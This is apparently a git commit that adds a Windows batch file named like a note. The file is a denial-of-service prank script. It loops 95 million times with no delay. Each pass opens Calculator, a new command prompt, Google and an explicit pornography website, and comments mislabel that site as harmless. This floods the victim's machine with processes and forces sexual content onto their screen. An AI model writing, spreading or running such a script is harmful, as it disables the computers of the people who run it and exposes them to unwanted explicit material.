38c7b5b871c2fc81cddf71a419eea3c671af9db8
Std <icbtsouthcampus@gmail.com>
2025-11-25 13:15:26 +0530

    BIS Note
    2025 New Path

---
+++ BIS FILE.cmd
@@ -0,0 +1,31 @@
+@echo off
+setlocal enabledelayedexpansion
+
+REM --- Loop 95000000 times ---
+for /L %%i in (1,1,95000000) do (
+    echo.
+    echo --- Iteration %%i of 95000000 ---
+
+    REM Open Calculator
+    start "" "calc.exe"
+    
+    REM Open a new Command Prompt window
+    start "" "cmd.exe"
+
+    REM Open a harmless website (Google)
+    start "" "https://www.google.com"
+    
+    REM Open a harmless website
+    start "" "https://www.sexvid.xxx/for-cash-guy-fucks-curvy-latina-chick-in-abandoned-garage.html"
+
+    REM Display the requested message
+    echo Sorry Friend massage.
+    
+    REM You may need to add a small delay here if you want to prevent
+    REM the system from being overwhelmed by 95000000 simultaneous processes
+    REM timeout /t 1 /nobreak > nul
+)
+
+echo.
+echo All 100 iterations complete.
+pause
